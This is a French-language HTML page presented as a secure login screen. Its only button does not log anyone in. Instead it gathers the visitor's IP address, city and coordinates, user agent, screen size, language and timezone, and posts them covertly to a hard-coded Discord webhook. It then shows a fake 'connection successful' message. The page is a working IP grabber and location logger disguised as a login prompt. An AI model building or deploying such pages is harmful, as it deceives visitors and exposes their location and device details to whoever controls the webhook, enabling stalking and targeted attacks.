<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acc√®s S√©curis√©</title>
    <style>
        :root {
            --primary: #5865F2;
            --secondary: #EB459E;
        }
        
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #1e1e2f, #2d2d42);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .login-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(12px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
            animation: fadeIn 0.8s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        h1 {
            margin-bottom: 30px;
            font-weight: 600;
            font-size: 28px;
            background: linear-gradient(to right, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .login-btn {
            background: linear-gradient(to right, var(--primary), var(--secondary));
            border: none;
            color: white;
            padding: 16px 32px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 20px rgba(88, 101, 242, 0.4);
            width: 100%;
            font-weight: 600;
            position: relative;
            overflow: hidden;
        }
        
        .login-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.6);
        }
        
        .login-btn:active {
            transform: translateY(1px);
        }
        
        .login-btn::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to right, rgba(255,255,255,0.2), rgba(255,255,255,0));
            transform: translateX(-100%);
            transition: transform 0.6s ease;
        }
        
        .login-btn:hover::after {
            transform: translateX(100%);
        }
        
        .status {
            margin-top: 20px;
            font-size: 14px;
            color: rgba(255,255,255,0.7);
            min-height: 20px;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <h1>Connexion Requise</h1>
        <button id="loginBtn" class="login-btn">SE CONNECTER</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        document.getElementById('loginBtn').addEventListener('click', async function() {
            const btn = this;
            const status = document.getElementById('status');
            
            try {
                // D√©sactiver le bouton pendant le traitement
                btn.disabled = true;
                btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite">‚Üª</span> Traitement...';
                status.textContent = "Collecte des informations...";
                
                // R√©cup√©rer l'IP et la localisation
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipResponse.json();
                
                const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const locData = await locResponse.json();
                
                // Formater les donn√©es pour Discord
                const embed = {
                    title: "Nouvelle connexion d√©tect√©e",
                    color: 0x5865F2,
                    fields: [
                        { name: "üåç Adresse IP", value: ip, inline: true },
                        { name: "üìç Localisation", value: `${locData.city}, ${locData.region}, ${locData.country_name}`, inline: true },
                        { name: "üó∫Ô∏è Lien Google Maps", value: `[Voir sur Maps](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})` },
                        { name: "üñ•Ô∏è Appareil", value: navigator.platform },
                        { name: "üîç User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
                        { name: "üñ•Ô∏è R√©solution", value: `${window.screen.width}x${window.screen.height}` },
                        { name: "üåê Langue", value: navigator.language },
                        { name: "‚è±Ô∏è Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
                        { name: "üìÖ Date/Heure", value: new Date().toLocaleString() }
                    ],
                    footer: { text: "Syst√®me de s√©curit√© automatique" },
                    timestamp: new Date().toISOString()
                };
                
                status.textContent = "Envoi des donn√©es...";
                
                // REMPLACER PAR VOTRE WEBHOOK DISCORD
                const webhookURL = 'https://discordapp.com/api/webhooks/1393637362151460985/rSzFt_8ovhnAbBIhsmHB33-BbUs8rr6_loE9-ig9feo8TfLeXDgADdDP_aU8TKYJST6Q';
                
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        username: "Security Bot",
                        avatar_url: "https://i.imgur.com/J5qKZQt.png",
                        embeds: [embed] 
                    })
                });
                
                if (response.ok) {
                    status.textContent = "‚úÖ Connexion r√©ussie!";
                    btn.textContent = "Connect√©";
                    
                    // Redirection apr√®s 2 secondes
                    setTimeout(() => {
                        window.location.href = "#"; // Mettez votre URL de redirection ici
                    }, 2000);
                } else {
                    throw new Error('Erreur lors de l\'envoi');
                }
                
            } catch (error) {
                console.error('Erreur:', error);
                status.textContent = "‚ùå Erreur, veuillez r√©essayer";
                btn.textContent = "R√©essayer";
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
